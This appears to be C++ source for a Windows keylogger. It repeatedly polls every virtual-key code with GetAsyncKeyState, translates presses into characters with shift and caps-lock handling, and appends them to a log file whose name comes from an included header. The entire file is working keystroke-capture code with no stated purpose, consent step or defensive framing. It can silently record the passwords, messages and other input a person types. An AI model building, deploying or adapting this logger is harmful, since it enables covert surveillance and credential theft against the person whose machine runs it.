#include <iostream>
#include <string>
#include <winsock2.h>
#include <windows.h>
#include <fstream>
#include <cstdlib>
#include <ctime>
#include <chrono>
#include <thread>

#include "winmon.h"

using namespace std;

bool capslock_pressed = false;
bool last_key_human_readable = false;

void save_in_file(string filename, string msg) {
    ofstream myfile;
    myfile.open(filename, ios_base::app);
    myfile << msg ;
    myfile.close();
}

void format_keys(int key_num, string key_opt_1, string key_opt_2) {
    string printed_string;

    // Getting stats of current key press
    bool isAlpha = (key_num >= 65 and key_num <= 90) ? true : false;
    bool isAlphaNumeric =  ((key_num >= 48 and key_num <= 57) || isAlpha) ? true : false;
    bool isGrammer =  ((key_num == 32) || (key_num >= 186 and key_num <= 226) || isAlphaNumeric) ? true : false;
    bool isHumanReadable = ((key_num == 32) || (key_num >= 48 && key_num <= 90) || (key_num >= 186 and key_num <= 222) || (key_num == 226));

    // Changing key press value depending upon shift and caps lock state
    bool shift_pressed = ((GetKeyState( VK_SHIFT ) & 0x8000) != 0) ? true : false;
    bool cl_pressed = ((GetKeyState( VK_CAPITAL ) & 0x8000) != 0) ? true : false;
    
    // Changing capslock's current state based on current capslock key press
    if (cl_pressed) capslock_pressed = (capslock_pressed) ? false : true;
    
    if (isAlpha and capslock_pressed) shift_pressed = true;
    printed_string = (shift_pressed) ? key_opt_2 : key_opt_1;
    
    // Skip printing ship and caps lock key presses
    if (key_num == 16 || key_num == 20 || key_num == 160) {
        return;
    }

    // // Formatting key press value for log file
    string temp = "";
    if (!last_key_human_readable) temp = "\n";
    printed_string = (isHumanReadable) ? temp + printed_string : "\n" + printed_string;
    save_in_file(g_key_press_logfile, printed_string);    
    last_key_human_readable = (isHumanReadable) ? true : false;
}

int detect_key_press() {
    while(1)
    {       
        this_thread::sleep_for(std::chrono::milliseconds(5));
        for (int i = 0; i < 256; i++) {
            if (GetAsyncKeyState(i) & 0x0001) {
                string key_opt_1;
                string key_opt_2;
                // Mapping key press value to human readable states
                switch (i) {
                    case 1: key_opt_1 = "<Mouse Left>"; key_opt_2 = "<Mouse Left>"; break;
                    case 2: key_opt_1 = "<Mosue Right>"; key_opt_2 = "<Mosue Right>"; break;  
                    case 3: key_opt_1 = "<Control-break>"; key_opt_2 = "<Control-break>"; break; 
                    case 4: key_opt_1 = "<Mouse Middle>"; key_opt_2 = "<Mouse Middle>"; break;  
                    case 5: key_opt_1 = "Mouse Forward Btn"; key_opt_2 = "Mouse Forward Btn"; break;  
                    case 6: key_opt_1 = "Mouse Backward Btn"; key_opt_2 = "Mouse Backward Btn"; break;  
                    case 8: key_opt_1 = "<BKSP>"; key_opt_2 = "<BKSP>"; break;  
                    case 9: key_opt_1 = "<TAB>"; key_opt_2 = "<TAB>"; break;  
                    case 12: key_opt_1 = "<CLEAR>"; key_opt_2 = "<CLEAR>"; break;  
                    case 13: key_opt_1 = "<ENTR>"; key_opt_2 = "<ENTR>"; break;  
                    case 16: key_opt_1 = "<SHIFT>"; key_opt_2 = "<SHIFT>"; break; 
                    case 17: key_opt_1 = "<CTRL>"; key_opt_2 = "<CTRL>"; break;  
                    case 18: key_opt_1 = "<ALT>"; key_opt_2 = "<ALT>"; break;  
                    case 19: key_opt_1 = "<PAUSE>"; key_opt_2 = "<PAUSE>"; break; 
                    case 20: key_opt_1 = "<CAPS>"; key_opt_2 = "<CAPS>"; break;  
                    case 27: key_opt_1 = "<ESC>"; key_opt_2 = "<ESC>"; break;  
                    case 32: key_opt_1 = " "; key_opt_2 = " "; break;  
                    case 33: key_opt_1 = "Page Up"; key_opt_2 = "Page Up"; break;  
                    case 34: key_opt_1 = "Page Dow"; key_opt_2 = "Page Dow"; break;  
                    case 35: key_opt_1 = "<END>"; key_opt_2 = "<END>"; break;  
                    case 36: key_opt_1 = "<HOME>"; key_opt_2 = "<HOME>"; break; 
                    case 37: key_opt_1 = "<LEFT>"; key_opt_2 = "<LEFT>"; break;  
                    case 38: key_opt_1 = "<UP>"; key_opt_2 = "<UP>"; break;  
                    case 39: key_opt_1 = "<RIGHT>"; key_opt_2 = "<RIGHT>"; break;  
                    case 40: key_opt_1 = "<DOWN>"; key_opt_2 = "<DOWN>"; break;  
                    case 41: key_opt_1 = "<SELECT>"; key_opt_2 = "<SELECT>"; break;  
                    case 42: key_opt_1 = "<PRINT>"; key_opt_2 = "<PRINT>"; break;  
                    case 43: key_opt_1 = "<EXECUTE>"; key_opt_2 = "<EXECUTE>"; break;  
                    case 44: key_opt_1 = "<PRINT>"; key_opt_2 = "<PRINT>"; break; 
                    case 45: key_opt_1 = "<INS>"; key_opt_2 = "<INS>"; break; 
                    case 46: key_opt_1 = "<DEL>"; key_opt_2 = "<DEL>"; break;
                    case 47: key_opt_1 = "<HELP>"; key_opt_2 = "<HELP>"; break;  
                    case 48: key_opt_1 = "0"; key_opt_2 = ")"; break;
                    case 49: key_opt_1 = "1"; key_opt_2 = "!"; break;
                    case 50: key_opt_1 = "2"; key_opt_2 = "@"; break;
                    case 51: key_opt_1 = "3"; key_opt_2 = "#"; break;
                    case 52: key_opt_1 = "4"; key_opt_2 = "$"; break;
                    case 53: key_opt_1 = "5"; key_opt_2 = "%"; break;
                    case 54: key_opt_1 = "6"; key_opt_2 = "^"; break;
                    case 55: key_opt_1 = "7"; key_opt_2 = "&"; break;
                    case 56: key_opt_1 = "8"; key_opt_2 = "*"; break;
                    case 57: key_opt_1 = "9"; key_opt_2 = "("; break;
                    case 65: key_opt_1 = "a"; key_opt_2 = "A"; break;
                    case 66: key_opt_1 = "b"; key_opt_2 = "B"; break;
                    case 67: key_opt_1 = "c"; key_opt_2 = "C"; break;
                    case 68: key_opt_1 = "d"; key_opt_2 = "D"; break;
                    case 69: key_opt_1 = "e"; key_opt_2 = "E"; break;
                    case 70: key_opt_1 = "f"; key_opt_2 = "F"; break;
                    case 71: key_opt_1 = "g"; key_opt_2 = "G"; break;
                    case 72: key_opt_1 = "h"; key_opt_2 = "H"; break;
                    case 73: key_opt_1 = "i"; key_opt_2 = "I"; break;
                    case 74: key_opt_1 = "j"; key_opt_2 = "J"; break;
                    case 75: key_opt_1 = "k"; key_opt_2 = "K"; break;
                    case 76: key_opt_1 = "l"; key_opt_2 = "L"; break;
                    case 77: key_opt_1 = "m"; key_opt_2 = "M"; break;
                    case 78: key_opt_1 = "n"; key_opt_2 = "N"; break;
                    case 79: key_opt_1 = "o"; key_opt_2 = "O"; break;
                    case 80: key_opt_1 = "p"; key_opt_2 = "P"; break;
                    case 81: key_opt_1 = "q"; key_opt_2 = "Q"; break;
                    case 82: key_opt_1 = "r"; key_opt_2 = "R"; break;
                    case 83: key_opt_1 = "s"; key_opt_2 = "S"; break;
                    case 84: key_opt_1 = "t"; key_opt_2 = "T"; break;
                    case 85: key_opt_1 = "u"; key_opt_2 = "U"; break;
                    case 86: key_opt_1 = "v"; key_opt_2 = "V"; break;
                    case 87: key_opt_1 = "w"; key_opt_2 = "W"; break;
                    case 88: key_opt_1 = "x"; key_opt_2 = "X"; break;
                    case 89: key_opt_1 = "y"; key_opt_2 = "Y"; break;
                    case 90: key_opt_1 = "z"; key_opt_2 = "Z"; break;
                    case 91: key_opt_1 = "<Left>"; key_opt_2 = "<Left>"; break;  
                    case 92: key_opt_1 = "<Right>"; key_opt_2 = "<Right>"; break; 
                    case 93: key_opt_1 = "<Applications>"; key_opt_2 = "<Applications>"; break; 
                    case 94: key_opt_1 = "<Reserved>"; key_opt_2 = "<Reserved>"; break; 
                    case 95: key_opt_1 = "<Computer>"; key_opt_2 = "<Computer>"; break; 
                    case 106: key_opt_1 = "<Multiply>"; key_opt_2 = "<Multiply>"; break; 
                    case 107: key_opt_1 = "<Add>"; key_opt_2 = "<Add>"; break; 
                    case 108: key_opt_1 = "<Separator>"; key_opt_2 = "<Separator>"; break; 
                    case 109: key_opt_1 = "<Subtract>"; key_opt_2 = "<Subtract>"; break;
                    case 110: key_opt_1 = "<Decimal>"; key_opt_2 = "<Decimal>"; break; 
                    case 111: key_opt_1 = "<Divide>"; key_opt_2 = "<Divide>"; break; 
                    case 144: printf("<NUM>"); break;
                    case 145: printf("<SCROLL>"); break;
                    case 172: printf("Home"); break;
                    case 173: printf("<Vol Mute>"); break;
                    case 174: printf("<Vol Dn>"); break;
                    case 175: printf("<Vol Up>"); break;
                    case 176: printf("<Next>"); break;
                    case 177: printf("<Prev>"); break;
                    case 178: printf("<Stop>"); break;
                    case 179: printf("<Play/Pause>"); break;
                    case 180: printf("<Strt>"); break;
                    case 181: printf("<Select>"); break;
                    case 182: printf("<Start>"); break;
                    case 183: printf("<Start>"); break;
                    case 186: key_opt_1 = ";"; key_opt_2 = ":"; break; 
                    case 187: key_opt_1 = "="; key_opt_2 = "+"; break;  
                    case 188: key_opt_1 = ","; key_opt_2 = "<"; break;
                    case 189: key_opt_1 = "-"; key_opt_2 = "_"; break; 
                    case 190: key_opt_1 = "."; key_opt_2 = ">"; break;
                    case 191: key_opt_1 = "/"; key_opt_2 = "?"; break;
                    case 192: key_opt_1 = "`"; key_opt_2 = "~"; break;
                    case 219: key_opt_1 = "["; key_opt_2 = "{"; break;
                    case 220: key_opt_1 = "\\"; key_opt_2 = "|"; break;
                    case 221: key_opt_1 = "]"; key_opt_2 = "}"; break;
                    case 222: key_opt_1 = "\'"; key_opt_2 = "\""; break;
                    case 223: key_opt_1 = "<Used>"; key_opt_2 = "<Used>"; break;
                    case 224: key_opt_1 = "<Reserved>"; key_opt_2 = "<Reserved>"; break;
                    case 226: key_opt_1 = ","; key_opt_2 = "<"; break;
                    case 229: key_opt_1 = "<IME>"; key_opt_2 = "<IME>"; break;
                    case 231: key_opt_1 = "<Used>"; key_opt_2 = "<Used>"; break;
                    case 246: key_opt_1 = "<Attn>"; key_opt_2 = "<Attn>"; break;
                    case 247: key_opt_1 = "<CrSel>"; key_opt_2 = "<CrSel>"; break;
                    case 248: key_opt_1 = "<ExSel>"; key_opt_2 = "<ExSel>"; break;
                    case 249: key_opt_1 = "<Erase>"; key_opt_2 = "<Erase>"; break;
                    case 250: key_opt_1 = "<Play>"; key_opt_2 = "<Play>"; break;
                    case 251: key_opt_1 = "<Zoom>"; key_opt_2 = "<Zoom>"; break;
                    case 252: key_opt_1 = "<Reserved>"; key_opt_2 = "<Reserved>"; break;
                    case 253: key_opt_1 = "<PA1>"; key_opt_2 = "<PA1>"; break;
                    case 254: key_opt_1 = "<Clear>"; key_opt_2 = "<Clear>"; break;
                    default: break; 
                } 
                
                format_keys(i, key_opt_1, key_opt_2);
            } 
        } 
    }
}

